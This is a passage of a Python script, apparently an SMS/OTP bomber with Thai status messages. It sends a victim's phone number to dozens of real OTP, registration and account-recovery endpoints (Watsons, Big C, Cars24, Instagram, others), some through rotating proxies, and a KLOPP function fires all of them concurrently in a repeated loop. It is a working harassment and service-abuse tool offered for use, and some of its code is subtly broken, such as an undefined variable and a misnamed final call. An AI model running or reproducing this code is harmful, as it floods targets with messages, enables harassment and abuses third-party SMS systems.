	r = requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}")
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api60(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha_new?mobile=66-{phone[1:]}",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Cookie": "_gcl_au=1.1.1240019298.1666928991; _gid=GA1.2.1014703120.1666928992; _gat_gtag_UA_42073293_1=1; _gat_UA-42073293-1=1; _ga=GA1.1.1652017962.1666928992; _tt_enable_cookie=1; _ttp=c9379e8a-4412-4cb2-9995-4cc812b3490b; _fbp=fb.1.1666928993552.476869943; _ga_YDQTL3X3WX=GS1.1.1666928992.1.0.1666928998.0.0.0"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api61(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.watsons.co.th/api/v2/wtcth/forms/combinedRegistrationForm/steps/wtcth_combinedRegistrationForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",headers={"user-agent": generate_user_agent(),"authorization":"bearer KDT4GwC7WLHdgLurm3ChB_vvvBE"},json={"otpTokenRequest":{"action":"REGISTRATION","type":"SMS","countryCode":"66","target":phone},"defaultAddress":{"mobileNumberCountryCode":"66","mobileNumber":phone},"mobileNumber":phone})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api62(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}?gaClientId=2050278932.1666930228&user-type=buyer&lang=th",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","cookie": "_gcl_au=1.1.786653043.1666930228;_gid=GA1.3.2033124357.1666930228;_dc_gtm_UA-65843992-28=1;_ga=GA1.3.2050278932.1666930228;_gaexp=GAX1.3.wdMsU-TcQXeB5H9GO-G4Tw.19357.1!AoYo68DrQk-jlcseD-b4FQ.19330.2!mDL1fU8cRPmYzvHq-QSfqg.19330.2;_fbp=fb.2.1666930233269.696060227;_hjSessionUser_2738441=eyJpZCI6IjA3ODJhN2RlLTEyNGItNWFjNy05MmE3LTcwNWE0YTllNTJiMSIsImNyZWF0ZWQiOjE2NjY5MzAyMzI3NzIsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjSession_2738441=eyJpZCI6ImY1MzllZDk0LWJlMjQtNDM0ZS05OGY1LWI0ODZhM2MzYTBkMiIsImNyZWF0ZWQiOjE2NjY5MzAyMzMzNTMsImluU2FtcGxlIjp0cnVlfQ==;_hjAbsoluteSessionInProgress=1;cto_bundle=YVwhbF9hWWRuREsxRm5VZnFpWGVpM0FxdGNTZ201Y2s5REUyT2pxVVVqNGZiS2pQaG5meXN2SXVLMzBCJTJGS3BuNWV4WGklMkY0ZjQxT2tRQnQ1ZkRzU0NibTd3MGxNTFViSDRRR1BrU21vdm5YcyUyRm1Da0xWaXRXayUyRlpBYmV5MUlBMjNaUVJYMmVncnJOajUwa0t6ZndWJTJCcmMzYzBRJTNEJTNE;_ga_7VGYE5TTVG=GS1.1.1666930228.1.1.1666930253.35.0.0"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api63(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.monkeyeveryday.com/graphql",headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","content-type": "application/json"},json={"operationName":"requestRegistrationOtp","variables":{"phone":phone},"query":"mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    __typename\n  }\n}\n"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api64(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.siamtv.com/api/magento/stvRequestOtp",headers={"cookie": "vsf-currency=THB; vsf-country=TH; _ga=GA1.3.1312430802.1667567753; _gid=GA1.3.178051979.1667567754; _gac_UA-183730445-1=1.1667567754.EAIaIQobChMIoaLX8s2U-wIVp51LBR3W_gpXEAAYAyAAEgIIsvD_BwE; _gat_UA-183730445-1=1; _ga=GA1.2.1312430802.1667567753; _gid=GA1.2.178051979.1667567754; _gac_UA-183730445-1=1.1667567754.EAIaIQobChMIoaLX8s2U-wIVp51LBR3W_gpXEAAYAyAAEgIIsvD_BwE; __lt__cid=d5a27710-ec28-4022-91ca-dda0053f169f; __lt__sid=7ca12acd-84bf7c1b; _fbp=fb.1.1667567755240.1303713922; __cf_bm=07yQ6q1Uqv4dBbIkcp0TgU_Ya.XIO0.5GltXMdNCGuE-1667567756-0-AcHVGl4CSvOQI7KQu+tnHThJtDxHE14G52Vt5xyptZUPZ3sUAlsVxrXehUZz9Hjl1c77sZBkfJeHCS+nd9YyuMEDPvNFuOOghbnB1D5Bk5u0y0Fplnlqcu9EWa32qJO7dA==; _fw_crm_v=2c4d0f87-2a84-4600-ab72-fa60cd7cae83; _tt_enable_cookie=1; _ttp=50187aa7-d037-40a7-a98f-07f6c5731f57; _ga_170K2683YN=GS1.1.1667567753.1.1.1667567759.54.0.0","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","content-type": "application/json;charset=UTF-8"},json=[{"action":"register","provider":"mobile","recipient":phone}])
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api65(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api66(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.yellowtire.com/api/user/request-otp",headers={"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"tel":phone})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api67(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.swopmart.co.th/graphql",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","authorization": "Bearer undefined"},json={"operationName":"requestOtpPhoneNumber","variables":{"phoneNumber":phone},"query":"mutation requestOtpPhoneNumber($phoneNumber: String!) {\n  requestOtpPhoneNumber(phoneNumber: $phoneNumber)\n}"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")

def api68(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://graph.firster.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/json"},json={"operationName":"sendOtp","variables":{"input":{"mobileNumber":f"{phone[1:]}","phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api69(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://openapi.bigc.co.th/customer/v1/otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/json"},json={"phone_no": phone})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api70(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.sabuyebuy.com/wp-json/api/v2/send-x",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36","content-type": "application/json"},json={"first_name":"askdhajshd","last_name":"jhasjdhasjd","address":"","birthday":"","phone":phone,"commissions_id":"","email_address":"aasdhas@Jhasd.asd","password":"as257400","agreements":"true","uuid":"3f202dcd-8093-4ff9-a263-07ff7e9bd282","affiliate_id":"1"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
        
def api71(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.post("https://www.easymoney.co.th/estimate/actionSendOtp",data=f"gg_token&name=cybersafe&surname=cybersafe&email=rjrockyou@gmail.com&phone={phone}&area_id=2&password=Hack80&password_chk=Hack80&code=&condition=1",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"PHPSESSID=1933025720c12fcbb618a207ad775e54;_gcl_au=1.1.506859633.1650848781;_fbp=fb.2.1650848782133.743024538;_ga=GA1.3.1379383593.1650848782;pdpa=1;_gid=GA1.3.380431543.1651807350;_gat_UA-182229042-1=1"})
    if r.status_code == 200 or r.status_code == 201:
	    printx(f"ยิงไปที่ {phone} สำเร็จ")
   





def api74(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.get(f"https://api.shadowtak.fun/api.php?&phone={phone}&method=SMS")
    if r.status_code == 200 or r.status_code == 201:
	     printx(f"ยิงไปที่ {phone} สำเร็จ")
   





   


def api75(phone):
    post("https://api.watsons.co.th/api/v2/wtcth/forms/extendedActivateMemberCardForm/steps/wtcth_extendedActivateMemberCardForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",
proxies ={"http" : "http://" + random.choice(proxy)},headers={
    "content-type": "application/json",
"x-anonymous-consents": "%5B%5D",
"accept": "application/json, text/plain, /",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"queueit-target": "https://www.watsons.co.th/register/activateMemberCard",
"sec-ch-ua-platform": "Android",
"origin": "https://www.watsons.co.th",
"referer": "https://www.watsons.co.th/"
    },
    json={"otpTokenRequest":{"action":"ACTIVATE_MEMBER_CARD","type":"SMS","countryCode":"66","target":f"{phone}"},"defaultAddress":{"mobileNumberCountryCode":"66","mobileNumber":f"{phone}"},"mobileNumber":f"{phone}"})


def api77(phone):
    requests.get(f"https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.1572308064.1653547614;_fbp=fb.1.1653547614308.1872923719;_gid=GA1.2.1794415642.1653547617;_tt_enable_cookie=1;_ttp=7eba6ff7-ff02-4342-b5dd-b9866f6efdee;f34c_cookieOrder_ID=38158040;PHPSESSID=uhm5651ofptiq9j3qn9rq4r8cl;f34c_new_user_view_count=%7B%22count%22%3A4%2C%22expire_time%22%3A1653634003%7D;_ga_Z9S47GV47R=GS1.1.1653557562.2.0.1653557563.0;_ga=GA1.2.1679688388.1653547616;_gat_UA-28072727-2=1"})
		
	
   
    
  
def apicall(phone):
    requests.post("https://1ufa.bet/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Content-Type": "application/x-www-form-urlencoded","cookie": "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"})
	
def api80(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
	if sms.status_code == 200 or sms.status_code == 201:
		  printx("ยิงไปที่ {phone} สำเร็จ")
		
		
def api81(phone):
            requests.post("https://shopgenix.com/api/sms/otp/", headers={
            "Host": "shopgenix.com",
            "content-length": "37",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "accept": "application/json, text/javascript, /; q=0.01",
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty"
            }, data=f"mobile_country_id=1&mobile={phone}")
  

def api82(phone):
	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"}, data={"phone": phone})
    
def api83(phone):
 	post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
    
def api84(phone):
        requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}")

def api85(phone):
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
        

def KLOPP(phone, amount):
	for i in range(amount):
		time.sleep(0)
		threading.submit(api1, phone)
		threading.submit(api2, phone)
		threading.submit(api3, phone)
		threading.submit(api4, phone)
		threading.submit(api5, phone)
		threading.submit(api6, phone)
		threading.submit(api7, phone)
		threading.submit(api8, phone)
		threading.submit(api9, phone)
		threading.submit(api10, phone)
		threading.submit(api11, phone)
		threading.submit(api12, phone)
		threading.submit(api13, phone)
		threading.submit(api14, phone)
		threading.submit(api15, phone)
		threading.submit(api16, phone)
		threading.submit(api17, phone)
		threading.submit(api18, phone)
		threading.submit(api19, phone)
		threading.submit(api20, phone)
		threading.submit(api21, phone)
		threading.submit(api22, phone)
		threading.submit(api23, phone)
		threading.submit(api24, phone)
		threading.submit(api25, phone)
		threading.submit(api26, phone)
		threading.submit(api27, phone)
		threading.submit(api28, phone)
		threading.submit(api29, phone)
		threading.submit(api30, phone)
		threading.submit(api31, phone)
		threading.submit(api32, phone)
		threading.submit(api33, phone)
		threading.submit(api34, phone)
		threading.submit(api35, phone)
		threading.submit(api36, phone)
		threading.submit(api37, phone)
		threading.submit(api38, phone)
		threading.submit(api39, phone)
		threading.submit(api40, phone)
		threading.submit(api41, phone)
		threading.submit(api42, phone)
		threading.submit(api43, phone)
		threading.submit(api44, phone)
		threading.submit(api45, phone)
		threading.submit(api46, phone)
		threading.submit(api47, phone)
		threading.submit(api48, phone)
		threading.submit(api49, phone)
		threading.submit(api50, phone)
		threading.submit(api51, phone)
		threading.submit(api52, phone)
		threading.submit(api53, phone)
		threading.submit(api54, phone)
		threading.submit(api55, phone)
		threading.submit(api56, phone)
		threading.submit(api57, phone)
		threading.submit(api58, phone)
		threading.submit(api59, phone)
		threading.submit(api60, phone)
		threading.submit(api61, phone)
		threading.submit(api62, phone)
		threading.submit(api63, phone)
		threading.submit(api64, phone)
		threading.submit(api65, phone)
		threading.submit(api66, phone)
		threading.submit(api67, phone)
		threading.submit(api68, phone)
		threading.submit(api69, phone)
		threading.submit(api70, phone)
		threading.submit(api71, phone)
		threading.submit(api74, phone)
		threading.submit(api75, phone)
		threading.submit(api77, phone)
		threading.submit(apicall, phone)
		threading.submit(api80, phone)
		threading.submit(api81, phone)
		threading.submit(api82, phone)
		threading.submit(api83, phone)
		threading.submit(api84, phone)
		threading.submit(api85, phone)
	    


		
		
		
KLOP()